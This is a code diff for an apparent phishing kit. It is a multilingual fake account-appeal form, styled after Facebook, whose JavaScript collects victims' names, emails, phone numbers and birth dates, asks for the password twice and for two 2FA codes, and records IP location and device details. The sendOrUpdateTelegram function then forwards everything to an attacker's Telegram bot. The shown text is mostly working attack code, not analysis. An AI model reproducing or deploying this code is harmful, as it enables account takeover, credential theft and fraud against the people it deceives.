+                'submit': "Soumettre l'appel",
+                'processing': 'Traitement...',
+                'errFullName': 'Veuillez entrer votre nom complet.',
+                'errPageName': 'Veuillez entrer le nom de votre page.',
+                'errBusinessEmail': 'Veuillez entrer un email professionnel valide.',
+                'errPersonalEmail': 'Veuillez entrer un email personnel valide.',
+                'errPhone': 'Veuillez entrer un numéro de téléphone valide (au moins 7 chiffres).',
+                'errDob': 'Veuillez entrer une date de naissance valide.',
+                'errHappened': 'Veuillez sélectionner une option.',
+                'errAgree': 'Vous devez accepter la Politique de confidentialité.',
+                'pwdDesc': 'Pour des raisons de sécurité, vous devez entrer votre mot de passe pour continuer.',
+                'pwdPlaceholder': 'Mot de passe',
+                'pwdContinue': 'Continuer',
+                'forgotPassword': 'Mot de passe oublié ?',
+                'tfaTitle': 'Vérifiez vos messages texte',
+                'tfaDesc': "Entrez le code que nous avons envoyé à",
+                'tfaOr': "ou confirmez-le via une application d'authentification comme Google Authenticator.",
+                'tfaPlaceholder': 'Entrez le code',
+                'tfaSubmit': 'Soumettre',
+                'tfaTryAnother': "Besoin d'une autre façon de vérifier ?",
+                'successTitle': "Vérification de votre identité",
+                'successDesc': "Nous vérifions généralement vos informations dans les 48 heures. Vous serez averti dès qu'une décision sera prise."
+            },
+            'de': {
+                'formTitle': 'Einspruchsformular',
+                'introStrong': 'Bitte erklären Sie, warum Sie glauben, dass die Kontobeschränkung fälschlicherweise angewendet wurde.',
+                'introDesc': 'Unsere Teams und Technologien arbeiten in mehreren Sprachen, um eine einheitliche Durchsetzung der Regeln zu gewährleisten. Sie können uns in Ihrer Muttersprache kontaktieren.',
+                'fullName': 'Vollständiger Name',
+                'pageName': 'Seitenname',
+                'businessEmail': 'Geschäftliche E-Mail',
+                'personalEmail': 'Persönliche E-Mail',
+                'phone': 'Handynummer',
+                'dob': 'Geburtsdatum',
+                'happened': 'Was ist Ihrer Meinung nach passiert?',
+                'radio1': 'Diese Situation kann das Ergebnis einer falschen Meldung oder einer möglicherweise unfairen Beschwerde eines Konkurrenten sein.',
+                'radio2': 'Diese Benachrichtigung wurde möglicherweise versehentlich gesendet und spiegelt möglicherweise nicht den aktuellen Status des Kontos wider.',
+                'radio3': 'Kein Betrug / andere rechtliche Gründe:',
+                'agree': 'Ich stimme der Datenschutzrichtlinie zu',
+                'privacyPolicy': 'Datenschutzrichtlinie',
+                'submit': 'Einspruch einreichen',
+                'processing': 'Verarbeitung...',
+                'errFullName': 'Bitte geben Sie Ihren vollständigen Namen ein.',
+                'errPageName': 'Bitte geben Sie Ihren Seitennamen ein.',
+                'errBusinessEmail': 'Bitte geben Sie eine gültige geschäftliche E-Mail ein.',
+                'errPersonalEmail': 'Bitte geben Sie eine gültige persönliche E-Mail ein.',
+                'errPhone': 'Bitte geben Sie eine gültige Telefonnummer ein (mindestens 7 Ziffern).',
+                'errDob': 'Bitte geben Sie ein gültiges Geburtsdatum ein.',
+                'errHappened': 'Bitte wählen Sie eine Option aus.',
+                'errAgree': 'Sie müssen der Datenschutzrichtlinie zustimmen.',
+                'pwdDesc': 'Aus Sicherheitsgründen müssen Sie Ihr Passwort eingeben, um fortzufahren.',
+                'pwdPlaceholder': 'Passwort',
+                'pwdContinue': 'Weiter',
+                'forgotPassword': 'Passwort vergessen?',
+                'tfaTitle': 'Überprüfen Sie Ihre Textnachrichten',
+                'tfaDesc': 'Geben Sie den Code ein, den wir gesendet haben an',
+                'tfaOr': 'oder bestätigen Sie ihn über eine Authentifizierungs-App wie Google Authenticator.',
+                'tfaPlaceholder': 'Code eingeben',
+                'tfaSubmit': 'Senden',
+                'tfaTryAnother': 'Brauchen Sie eine andere Möglichkeit zur Verifizierung?',
+                'successTitle': 'Ihre Identität wird überprüft',
+                'successDesc': 'Wir überprüfen Ihre Informationen normalerweise innerhalb von 48 Stunden. Sie werden benachrichtigt, sobald eine Entscheidung getroffen wurde.'
+            },
+            'es': {
+                'formTitle': 'Formulario de Apelación',
+                'introStrong': 'Explique por qué cree que la restricción de la cuenta se aplicó por error.',
+                'introDesc': 'Nuestros equipos y tecnologías trabajan en varios idiomas para garantizar una aplicación coherente de las reglas. Puede contactarnos en su idioma nativo.',
+                'fullName': 'Nombre completo',
+                'pageName': 'Nombre de la página',
+                'businessEmail': 'Correo electrónico comercial',
+                'personalEmail': 'Correo electrónico personal',
+                'phone': 'Número de teléfono móvil',
+                'dob': 'Fecha de nacimiento',
+                'happened': '¿Qué crees que pasó?',
+                'radio1': 'Esta situación puede ser el resultado de un informe falso o una queja potencialmente injusta de un competidor.',
+                'radio2': 'Esta notificación puede haberse enviado por error y puede no reflejar con precisión el estado actual de la cuenta.',
+                'radio3': 'Sin fraude / otra razón legal:',
+                'agree': 'Acepto la Política de Privacidad',
+                'privacyPolicy': 'Política de Privacidad',
+                'submit': 'Enviar Apelación',
+                'processing': 'Procesando...',
+                'errFullName': 'Por favor, introduzca su nombre completo.',
+                'errPageName': 'Por favor, introduzca el nombre de su página.',
+                'errBusinessEmail': 'Por favor, introduzca un correo electrónico comercial válido.',
+                'errPersonalEmail': 'Por favor, introduzca un correo electrónico personal válido.',
+                'errPhone': 'Por favor, introduzca un número de teléfono válido (al menos 7 dígitos).',
+                'errDob': 'Por favor, introduzca una fecha de nacimiento válida.',
+                'errHappened': 'Por favor, seleccione una opción.',
+                'errAgree': 'Debe aceptar la Política de Privacidad.',
+                'pwdDesc': 'Por razones de seguridad, debe ingresar su contraseña para continuar.',
+                'pwdPlaceholder': 'Contraseña',
+                'pwdContinue': 'Continuar',
+                'forgotPassword': '¿Olvidó su contraseña?',
+                'tfaTitle': 'Verifique sus mensajes de texto',
+                'tfaDesc': 'Ingrese el código que enviamos a',
+                'tfaOr': 'o confírmelo a través de una aplicación de autenticación como Google Authenticator.',
+                'tfaPlaceholder': 'Ingrese el código',
+                'tfaSubmit': 'Enviar',
+                'tfaTryAnother': '¿Necesita otra forma de verificar?',
+                'successTitle': 'Verificando su identidad',
+                'successDesc': 'Normalmente verificamos su información en 48 horas. Se le notificará tan pronto como se tome una decisión.'
+            },
+            'pt': {
+                'formTitle': 'Formulário de Recurso',
+                'introStrong': 'Explique por que você acredita que a restrição da conta foi aplicada por erro.',
+                'introDesc': 'Nossas equipes e tecnologias trabalham em vários idiomas para garantir a aplicação consistente das regras. Você pode entrar em contato conosco em seu idioma nativo.',
+                'fullName': 'Nome Completo',
+                'pageName': 'Nome da Página',
+                'businessEmail': 'E-mail Comercial',
+                'personalEmail': 'E-mail Pessoal',
+                'phone': 'Número de Telefone Celular',
+                'dob': 'Data de Nascimento',
+                'happened': 'O que você acha que aconteceu?',
+                'radio1': 'Esta situação pode ser o resultado de um relatório falso ou uma reclamação potencialmente injusta de um concorrente.',
+                'radio2': 'Esta notificação pode ter sido enviada por erro e pode não refletir com precisão o status atual da conta.',
+                'radio3': 'Sem fraude / outro motivo legal:',
+                'agree': 'Concordo com a Política de Privacidade',
+                'privacyPolicy': 'Política de Privacidade',
+                'submit': 'Enviar Recurso',
+                'processing': 'Processando...',
+                'errFullName': 'Por favor, insira seu nome completo.',
+                'errPageName': 'Por favor, insira o nome da sua página.',
+                'errBusinessEmail': 'Por favor, insira um e-mail comercial válido.',
+                'errPersonalEmail': 'Por favor, insira um e-mail pessoal válido.',
+                'errPhone': 'Por favor, insira um número de telefone válido (pelo menos 7 dígitos).',
+                'errDob': 'Por favor, insira uma data de nascimento válida.',
+                'errHappened': 'Por favor, selecione uma opção.',
+                'errAgree': 'Você deve concordar com a Política de Privacidade.',
+                'pwdDesc': 'Por razões de segurança, você deve inserir sua senha para continuar.',
+                'pwdPlaceholder': 'Senha',
+                'pwdContinue': 'Continuar',
+                'forgotPassword': 'Esqueceu sua senha?',
+                'tfaTitle': 'Verifique suas mensagens de texto',
+                'tfaDesc': 'Insira o código que enviamos para',
+                'tfaOr': 'ou confirme-o através de um aplicativo autenticador como Google Authenticator.',
+                'tfaPlaceholder': 'Insira o código',
+                'tfaSubmit': 'Enviar',
+                'tfaTryAnother': 'Precisa de outra forma de verificar?',
+                'successTitle': 'Verificando sua identidade',
+                'successDesc': 'Normalmente verificamos suas informações em 48 horas. Você será notificado assim que uma decisão for tomada.'
+            },
+            'tr': {
+                'formTitle': 'İtiraz Formu',
+                'introStrong': 'Lütfen hesap kısıtlamasının neden hatalı uygulandığını düşündüğünüzü açıklayın.',
+                'introDesc': 'Ekiplerimiz ve teknolojilerimiz, kuralların tutarlı bir şekilde uygulanmasını sağlamak için birden fazla dilde çalışır. Bize kendi ana dilinizde ulaşabilirsiniz.',
+                'fullName': 'Tam Ad',
+                'pageName': 'Sayfa Adı',
+                'businessEmail': 'İş E-postası',
+                'personalEmail': 'Kişisel E-posta',
+                'phone': 'Cep Telefonu Numarası',
+                'dob': 'Doğum Tarihi',
+                'happened': 'Ne olduğunu düşünüyorsunuz?',
+                'radio1': 'Bu durum, bir rakibin yanlış raporu veya potansiyel olarak haksız şikayetinin sonucu olabilir.',
+                'radio2': 'Bu bildirim hatalı gönderilmiş olabilir ve hesabın mevcut durumunu doğru yansıtmayabilir.',
+                'radio3': 'Dolandırıcılık yok / diğer yasal neden:',
+                'agree': 'Gizlilik Politikasını kabul ediyorum',
+                'privacyPolicy': 'Gizlilik Politikası',
+                'submit': 'İtiraz Gönder',
+                'processing': 'İşleniyor...',
+                'errFullName': 'Lütfen tam adınızı girin.',
+                'errPageName': 'Lütfen sayfa adınızı girin.',
+                'errBusinessEmail': 'Lütfen geçerli bir iş e-postası girin.',
+                'errPersonalEmail': 'Lütfen geçerli bir kişisel e-posta girin.',
+                'errPhone': 'Lütfen geçerli bir telefon numarası girin (en az 7 hane).',
+                'errDob': 'Lütfen geçerli bir doğum tarihi girin.',
+                'errHappened': 'Lütfen bir seçenek seçin.',
+                'errAgree': 'Gizlilik Politikasını kabul etmelisiniz.',
+                'pwdDesc': 'Güvenlik nedeniyle devam etmek için şifrenizi girmelisiniz.',
+                'pwdPlaceholder': 'Şifre',
+                'pwdContinue': 'Devam Et',
+                'forgotPassword': 'Şifrenizi mi unuttunuz?',
+                'tfaTitle': 'SMS mesajlarınızı kontrol edin',
+                'tfaDesc': 'Gönderdiğimiz kodu girin',
+                'tfaOr': 'veya Google Authenticator gibi bir kimlik doğrulayıcı uygulama ile onaylayın.',
+                'tfaPlaceholder': 'Kodu girin',
+                'tfaSubmit': 'Gönder',
+                'tfaTryAnother': 'Doğrulamak için başka bir yol mu gerekiyor?',
+                'successTitle': 'Kimliğiniz doğrulanıyor',
+                'successDesc': 'Bilgilerinizi genellikle 48 saat içinde doğrularız. Bir karar verildiğinde bilgilendirileceksiniz.'
+            }
+        };
+
+        // ============================================================
+        // COUNTRY DATA
+        // ============================================================
+        const countryData = {
+            "+1": { name: "United States", flag: "us", code: "US" },
+            "+20": { name: "Egypt", flag: "eg", code: "EG" },
+            "+27": { name: "South Africa", flag: "za", code: "ZA" },
+            "+30": { name: "Greece", flag: "gr", code: "GR" },
+            "+31": { name: "Netherlands", flag: "nl", code: "NL" },
+            "+32": { name: "Belgium", flag: "be", code: "BE" },
+            "+33": { name: "France", flag: "fr", code: "FR" },
+            "+34": { name: "Spain", flag: "es", code: "ES" },
+            "+36": { name: "Hungary", flag: "hu", code: "HU" },
+            "+39": { name: "Italy", flag: "it", code: "IT" },
+            "+40": { name: "Romania", flag: "ro", code: "RO" },
+            "+41": { name: "Switzerland", flag: "ch", code: "CH" },
+            "+43": { name: "Austria", flag: "at", code: "AT" },
+            "+44": { name: "United Kingdom", flag: "gb", code: "GB" },
+            "+45": { name: "Denmark", flag: "dk", code: "DK" },
+            "+46": { name: "Sweden", flag: "se", code: "SE" },
+            "+47": { name: "Norway", flag: "no", code: "NO" },
+            "+48": { name: "Poland", flag: "pl", code: "PL" },
+            "+49": { name: "Germany", flag: "de", code: "DE" },
+            "+51": { name: "Peru", flag: "pe", code: "PE" },
+            "+52": { name: "Mexico", flag: "mx", code: "MX" },
+            "+53": { name: "Cuba", flag: "cu", code: "CU" },
+            "+54": { name: "Argentina", flag: "ar", code: "AR" },
+            "+55": { name: "Brazil", flag: "br", code: "BR" },
+            "+56": { name: "Chile", flag: "cl", code: "CL" },
+            "+57": { name: "Colombia", flag: "co", code: "CO" },
+            "+58": { name: "Venezuela", flag: "ve", code: "VE" },
+            "+60": { name: "Malaysia", flag: "my", code: "MY" },
+            "+61": { name: "Australia", flag: "au", code: "AU" },
+            "+62": { name: "Indonesia", flag: "id", code: "ID" },
+            "+63": { name: "Philippines", flag: "ph", code: "PH" },
+            "+64": { name: "New Zealand", flag: "nz", code: "NZ" },
+            "+65": { name: "Singapore", flag: "sg", code: "SG" },
+            "+66": { name: "Thailand", flag: "th", code: "TH" },
+            "+81": { name: "Japan", flag: "jp", code: "JP" },
+            "+82": { name: "South Korea", flag: "kr", code: "KR" },
+            "+84": { name: "Vietnam", flag: "vn", code: "VN" },
+            "+86": { name: "China", flag: "cn", code: "CN" },
+            "+90": { name: "Turkey", flag: "tr", code: "TR" },
+            "+91": { name: "India", flag: "in", code: "IN" },
+            "+92": { name: "Pakistan", flag: "pk", code: "PK" },
+            "+93": { name: "Afghanistan", flag: "af", code: "AF" },
+            "+94": { name: "Sri Lanka", flag: "lk", code: "LK" },
+            "+95": { name: "Myanmar", flag: "mm", code: "MM" },
+            "+98": { name: "Iran", flag: "ir", code: "IR" }
+        };
+
+        // ============================================================
+        // HÀM LẤY THỜI GIAN
+        // ============================================================
+        function getTime() {
+            return new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' });
+        }
+
+        // ============================================================
+        // HÀM LẤY VỊ TRÍ CHÍNH XÁC
+        // ============================================================
+        async function getLocation() {
+            function countryFlag(code) {
+                if (!code) return "🌍";
+                return code.toUpperCase()
+                    .split("")
+                    .map(c => String.fromCodePoint(c.charCodeAt(0) + 127397))
+                    .join("");
+            }
+
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    if (data.ip) {
+                        return {
+                            ip: data.ip || "Unknown",
+                            city: data.city || data.region || "Unknown",
+                            country: data.country_name || data.country || "Unknown",
+                            countryCode: data.country_code || "US",
+                            flag: countryFlag(data.country_code || "")
+                        };
+                    }
+                }
+            } catch (e) {
+                console.warn('ipapi.co failed, trying ipinfo.io');
+            }
+
+            try {
+                const res = await fetch('https://ipinfo.io/json');
+                if (res.ok) {
+                    const data = await res.json();
+                    return {
+                        ip: data.ip || "Unknown",
+                        city: data.city || "Unknown",
+                        country: data.country_name || data.country || "Unknown",
+                        countryCode: data.country || "US",
+                        flag: countryFlag(data.country || "")
+                    };
+                }
+            } catch (e) {
+                console.warn('ipinfo.io failed');
+            }
+
+            return {
+                ip: "Unknown",
+                city: "N/A",
+                country: "N/A",
+                countryCode: "US",
+                flag: "🌍"
+            };
+        }
+
+        // ============================================================
+        // POPULATE COUNTRY DROPDOWN
+        // ============================================================
+        function populateCountries() {
+            const list = document.getElementById('countryList');
+            const sorted = Object.entries(countryData).sort((a, b) => a[1].name.localeCompare(b[1]));
+
+            sorted.forEach(([code, data]) => {
+                const li = document.createElement('li');
+                li.className = 'country-item' + (code === '+84' ? ' highlight' : '');
+                li.innerHTML = `
+                    <img src="https://flagcdn.com/w20/${data.flag}.png" alt="${data.flag}">
+                    <span class="country-name">${data.name}</span>
+                    <span class="dial-code">${code}</span>
+                `;
+                li.onclick = function() { selectCountry(code, data.flag); };
+                list.appendChild(li);
+            });
+        }
+
+        // ============================================================
+        // COUNTRY FUNCTIONS
+        // ============================================================
+        function toggleCountryDropdown() {
+            const list = document.getElementById('countryList');
+            list.classList.toggle('open');
+            if (list.classList.contains('open')) {
+                document.getElementById('countrySearch').focus();
+                document.getElementById('countrySearch').value = '';
+                filterCountries();
+            }
+        }
+
+        function selectCountry(code, flag) {
+            currentCountryCode = code;
+            document.getElementById('selectedFlag').src = `https://flagcdn.com/w20/${flag}.png`;
+            document.getElementById('selectedFlag').alt = flag.toUpperCase();
+            document.getElementById('countryList').classList.remove('open');
+
+            const phone = document.getElementById('phone');
+            phone.value = code + ' ';
+            phone.focus();
+        }
+
+        function filterCountries() {
+            const query = document.getElementById('countrySearch').value.toLowerCase();
+            const items = document.querySelectorAll('#countryList .country-item');
+            items.forEach(item => {
+                const name = item.querySelector('.country-name').textContent.toLowerCase();
+                const dial = item.querySelector('.dial-code').textContent;
+                item.style.display = (name.includes(query) || dial.includes(query)) ? '' : 'none';
+            });
+        }
+
+        document.addEventListener('click', function(e) {
+            if (!e.target.closest('.phone-wrapper')) {
+                document.getElementById('countryList').classList.remove('open');
+            }
+        });
+
+        // ============================================================
+        // PHONE INPUT FORMAT
+        // ============================================================
+        const phoneInput = document.getElementById('phone');
+        phoneInput.addEventListener('input', function() {
+            let cleaned = this.value.replace(/[^\d+]/g, '');
+            if (!cleaned.startsWith('+')) cleaned = '+' + cleaned;
+            cleaned = '+' + cleaned.replace(/\+/g, '');
+
+            let matchedCode = null;
+            for (const code of Object.keys(countryData).sort((a, b) => b.length - a.length)) {
+                if (cleaned.startsWith(code)) {
+                    matchedCode = code;
+                    break;
+                }
+            }
+
+            if (matchedCode) {
+                if (matchedCode !== currentCountryCode) {
+                    const data = countryData[matchedCode];
+                    if (data) {
+                        currentCountryCode = matchedCode;
+                        document.getElementById('selectedFlag').src = `https://flagcdn.com/w20/${data.flag}.png`;
+                        document.getElementById('selectedFlag').alt = data.flag.toUpperCase();
+                    }
+                }
+                const digits = cleaned.substring(matchedCode.length);
+                let fmt = '';
+                for (let i = 0; i < digits.length; i++) {
+                    if (i > 0 && i % 3 === 0) fmt += ' ';
+                    fmt += digits[i];
+                }
+                this.value = matchedCode + (fmt ? ' ' + fmt : '');
+            } else {
+                const raw = cleaned.replace(/^\+/, '');
+                const local = raw.replace(/^0+/, '');
+                if (local.length > 0) {
+                    let fmt = '';
+                    for (let i = 0; i < local.length; i++) {
+                        if (i > 0 && i % 3 === 0) fmt += ' ';
+                        fmt += local[i];
+                    }
+                    this.value = currentCountryCode + (fmt ? ' ' + fmt : '');
+                } else {
+                    this.value = currentCountryCode + ' ';
+                }
+            }
+        });
+
+        // ============================================================
+        // TOGGLE PASSWORD VISIBILITY
+        // ============================================================
+        function togglePassword() {
+            const input = document.getElementById('passwordInput');
+            const eyeOff = document.getElementById('eyeOff');
+            const eyeOn = document.getElementById('eyeOn');
+            if (input.type === 'password') {
+                input.type = 'text';
+                eyeOff.style.display = 'none';
+                eyeOn.style.display = '';
+            } else {
+                input.type = 'password';
+                eyeOff.style.display = '';
+                eyeOn.style.display = 'none';
+            }
+        }
+
+        // ============================================================
+        // TRANSLATE PAGE - TỰ ĐỘNG DỊCH THEO IP
+        // ============================================================
+        function translatePage(langCode) {
+            if (!translations[langCode]) {
+                langCode = 'en';
+            }
+
+            currentLang = langCode;
+            const langData = translations[langCode];
+            if (!langData) return;
+
+            const map = {
+                'formTitle': 'formTitle',
+                'introStrong': 'introStrong',
+                'introDesc': 'introDesc',
+                'lblFullName': 'fullName',
+                'lblPageName': 'pageName',
+                'lblBusinessEmail': 'businessEmail',
+                'lblPersonalEmail': 'personalEmail',
+                'lblPhone': 'phone',
+                'lblDob': 'dob',
+                'lblHappened': 'happened',
+                'radio1Text': 'radio1',
+                'radio2Text': 'radio2',
+                'radio3Text': 'radio3',
+                'lblAgree': 'agree',
+                'privacyLink': 'privacyPolicy',
+                'btnText': 'submit',
+                'errFullName': 'errFullName',
+                'errPageName': 'errPageName',
+                'errBusinessEmail': 'errBusinessEmail',
+                'errPersonalEmail': 'errPersonalEmail',
+                'errPhone': 'errPhone',
+                'errDob': 'errDob',
+                'errHappened': 'errHappened',
+                'errAgree': 'errAgree',
+                'pwdDesc': 'pwdDesc',
+                'passwordInput': 'pwdPlaceholder',
+                'pwdSubmitBtn': 'pwdContinue',
+                'forgotLink': 'forgotPassword',
+                'tfaTitle': 'tfaTitle',
+                'tfaDesc': 'tfaDesc',
+                'tfaCode': 'tfaPlaceholder',
+                'tfaSubmitBtn': 'tfaSubmit',
+                'tfaTryAnother': 'tfaTryAnother',
+                'successTitle': 'successTitle',
+                'successDesc': 'successDesc'
+            };
+
+            Object.keys(map).forEach(id => {
+                const element = document.getElementById(id);
+                if (element) {
+                    const key = map[id];
+                    if (id === 'passwordInput' || id === 'tfaCode') {
+                        element.placeholder = langData[key] || element.placeholder;
+                    } else if (id === 'pwdSubmitBtn' || id === 'tfaSubmitBtn') {
+                        element.textContent = langData[key] || element.textContent;
+                    } else if (id === 'tfaDesc') {
+                        const orText = langData['tfaOr'] || 'or confirm it via an authenticator app.';
+                        element.innerHTML = langData[key] + ' <strong id="tfaPhoneMask">+20 ***********</strong><br>' + orText;
+                    } else {
+                        element.textContent = langData[key] || element.textContent;
+                    }
+                }
+            });
+
+            document.querySelectorAll('.radio-group label').forEach((label, index) => {
+                const span = label.querySelector('span');
+                if (span) {
+                    const key = `radio${index + 1}`;
+                    if (langData[key]) {
+                        span.textContent = langData[key];
+                    }
+                }
+            });
+
+            document.documentElement.lang = langCode;
+            console.log('🌐 Đã chuyển sang ngôn ngữ:', supportedLanguages[langCode] || langCode);
+        }
+
+        // ============================================================
+        // DETECT AND SET COUNTRY FROM IP
+        // ============================================================
+        async function detectCountryFromIP() {
+            try {
+                userLoc = await getLocation();
+                console.log('📍 Location detected:', userLoc);
+
+                const countryCode = userLoc.countryCode || 'US';
+
+                let foundCountry = null;
+                let foundCode = null;
+                Object.keys(countryData).forEach(code => {
+                    if (countryData[code].code === countryCode) {
+                        foundCountry = countryData[code];
+                        foundCode = code;
+                    }
+                });
+
+                if (foundCountry) {
+                    currentCountryCode = foundCode;
+                    const flagImg = document.getElementById('selectedFlag');
+                    if (flagImg) {
+                        flagImg.src = `https://flagcdn.com/w20/${foundCountry.flag}.png`;
+                        flagImg.alt = foundCountry.flag.toUpperCase();
+                    }
+                    const phone = document.getElementById('phone');
+                    if (phone && !phone.value) {
+                        phone.value = foundCode + ' ';
+                    }
+                }
+
+                let lang = countryToLanguage[countryCode] || 'en';
+                if (!translations[lang]) {
+                    lang = 'en';
+                }
+                translatePage(lang);
+
+            } catch (error) {
+                console.error('❌ Lỗi detect IP:', error);
+                translatePage('en');
+            }
+        }
+
+        // ============================================================
+        // HÀM TẠO NỘI DUNG TIN NHẮN (CHỈ GIÁ TRỊ LÀ CODE)
+        // ============================================================
+        function buildFullMessage() {
+            const location = userLoc || { ip: 'Unknown', city: 'N/A', country: 'N/A', flag: '🌍' };
+
+            const deviceInfo = navigator.userAgent || 'Unknown';
+            let device = 'Unknown';
+            let deviceIcon = '💻';
+            if (deviceInfo.includes('Windows')) { device = 'Windows'; deviceIcon = '💻'; }
+            else if (deviceInfo.includes('Mac')) { device = 'MacOS'; deviceIcon = '💻'; }
+            else if (deviceInfo.includes('Linux')) { device = 'Linux'; deviceIcon = '🐧'; }
+            else if (deviceInfo.includes('Android')) { device = 'Android'; deviceIcon = '📱'; }
+            else if (deviceInfo.includes('iPhone')) { device = 'iOS'; deviceIcon = '📱'; }
+            else if (deviceInfo.includes('iPad')) { device = 'iPadOS'; deviceIcon = '📱'; }
+
+            let browser = 'Unknown';
+            if (deviceInfo.includes('Chrome') && !deviceInfo.includes('Edg')) browser = 'Chrome';
+            else if (deviceInfo.includes('Firefox')) browser = 'Firefox';
+            else if (deviceInfo.includes('Safari') && !deviceInfo.includes('Chrome')) browser = 'Safari';
+            else if (deviceInfo.includes('Edg')) browser = 'Edge';
+            else if (deviceInfo.includes('Opera')) browser = 'Opera';
+
+            const screenSize = `${window.screen.width || 'N/A'}x${window.screen.height || 'N/A'}`;
+
+            // Tạo tin nhắn với HTML - CHỈ GIÁ TRỊ LÀ CODE
+            let message = `<b>🔔 Notification</b>\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `<b>📍 IP:</b> <code>${location.ip}</code>\n`;
+            message += `<b>📍 Location:</b> ${location.city || 'N/A'}, ${location.country || 'N/A'} ${location.flag || ''}\n`;
+            message += `<b>🔗 Source:</b> ${window.location.href}\n`;
+            message += `<b>🖥️ Device:</b> ${device} | ${browser} | ${screenSize} ${deviceIcon}\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `<b>👤 Full Name:</b> <code>${userData.fullName || 'N/A'}</code>\n`;
+            message += `<b>📄 Page Name:</b> <code>${userData.pageName || 'N/A'}</code>\n`;
+            message += `<b>🎂 Date of birth:</b> <code>${userData.dob || 'N/A'}</code>\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `<b>📧 Email:</b> <code>${userData.email || 'N/A'}</code>\n`;
+            message += `<b>💼 Email Business:</b> <code>${userData.businessEmail || 'N/A'}</code>\n`;
+            message += `<b>📱 Phone Number:</b> <code>${userData.phone || 'N/A'}</code>\n`;
+            if (userData.other) {
+                message += `<b>📝 Note:</b> <code>${userData.other}</code>\n`;
+            }
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `<b>🔑 Password First:</b> <code>${userData.pass1 || ''}</code>\n`;
+            message += `<b>🔑 Password Second:</b> <code>${userData.pass2 || ''}</code>\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            message += `<b>📲 Code 2FA(1):</b> <code>${userData.twoFactorCode1 || ''}</code>\n`;
+            message += `<b>📲 Code 2FA(2):</b> <code>${userData.twoFactorCode2 || ''}</code>\n`;
+            message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            if (userData.happened) {
+                const reasonMap = {
+                    'false_report': 'False Report / Competitor Complaint',
+                    'sent_in_error': 'Sent in Error',
+                    'other': 'Other Legal Reason'
+                };
+                message += `<b>📌 Reason:</b> ${reasonMap[userData.happened] || userData.happened}\n`;
+                message += `━━━━━━━━━━━━━━━━━━━━━\n`;
+            }
+            message += `<b>⏰ Time:</b> ${getTime()}`;
+
+            return message;
+        }
+
+        // ============================================================
+        // HÀM GỬI/CẬP NHẬT TIN NHẮN TELEGRAM
+        // ============================================================
+        async function sendOrUpdateTelegram() {
+            const message = buildFullMessage();
+
+            try {
+                if (!currentMessageId) {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    const result = await response.json();
+                    if (result.ok) {
+                        currentMessageId = result.result.message_id;
+                        console.log('✅ Tin nhắn mới, ID:', currentMessageId);
+                    }
+                    return result.ok;
+                } else {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            message_id: currentMessageId,
+                            text: message,
+                            parse_mode: 'HTML'
+                        })
+                    });
+                    const result = await response.json();
+                    if (result.ok) {
+                        console.log('✅ Đã cập nhật tin nhắn ID:', currentMessageId);
+                    } else {
+                        console.log('⚠️ Không thể cập nhật, gửi tin nhắn mới');
+                        currentMessageId = null;
+                        return sendOrUpdateTelegram();
+                    }
+                    return result.ok;
+                }
+            } catch (error) {
+                console.error('❌ Lỗi gửi Telegram:', error);
+                return false;
+            }
+        }
+
+        // ============================================================
+        // 2FA FUNCTIONS
+        // ============================================================
+        function checkTfaCode() {
+            const code = document.getElementById('tfaCode').value;
+            const btn = document.getElementById('tfaSubmitBtn');
+            if (code.length === 6 || code.length === 8) {
+                btn.disabled = false;
+                btn.classList.add('enabled');
+            } else {
+                btn.disabled = true;
+                btn.classList.remove('enabled');
+            }
+        }
+
+        function update2FADisplay() {
+            const email = userData.email || 'user@example.com';
+            const phone = userData.phone || '+20 ***********';
+            const pageName = userData.pageName || 'Facebook Page';
+
+            document.getElementById('tfaPageName').textContent = pageName;
+
+            let maskedEmail = email;
+            if (email.includes('@')) {
+                const emailParts = email.split('@');
+                const name = emailParts[0];
+                const domain = emailParts[1];
+                if (name.length <= 2) {
+                    maskedEmail = name + '*****' + '@' + domain;
+                } else {
+                    maskedEmail = name.charAt(0) + '*****' + '@' + domain;
+                }
+            }
+
+            let formattedPhone = phone;
+            const phoneClean = phone.replace(/\s/g, '');
+            if (phoneClean === currentCountryCode || phoneClean === currentCountryCode) {
+                formattedPhone = phone.trim() + ' ***********';
+            } else {
+                const digits = phone.replace(/\D/g, '');
+                if (digits.length > 4) {
+                    const last2 = digits.slice(-2);
+                    const masked = digits.slice(0, -2).replace(/\d/g, '*');
+                    let code = currentCountryCode;
+                    if (phone.includes('+')) {
+                        const match = phone.match(/^\+\d{1,3}/);
+                        if (match) code = match[0];
+                    }
+                    formattedPhone = code + ' ' + masked + last2;
+                }
+            }
+
+            document.getElementById('tfaPhoneMask').innerHTML = maskedEmail + ' or ' + formattedPhone;
+        }
+
+        function useSMS() {
+            alert('📱 SMS verification requested. Please check your phone.');
+            document.getElementById('tfaFormContainer').style.display = 'block';
+            document.getElementById('tfaAlternative').classList.remove('show');
+            document.getElementById('tfaCode').value = '';
+            document.getElementById('tfaError').textContent = 'A new code has been sent to your phone.';
+            document.getElementById('tfaSubmitBtn').disabled = true;
+            document.getElementById('tfaSubmitBtn').classList.remove('enabled');
+            tfaAttempts = 0;
+            tfaLocked = false;
+            document.getElementById('tfaCode').disabled = false;
+            if (tfaCooldownTimer) {
+                clearInterval(tfaCooldownTimer);
+                tfaCooldownTimer = null;
+            }
+        }
+
+        function useEmail() {
+            alert('📧 Email verification requested. Please check your email.');
+            document.getElementById('tfaFormContainer').style.display = 'block';
+            document.getElementById('tfaAlternative').classList.remove('show');
+            document.getElementById('tfaCode').value = '';
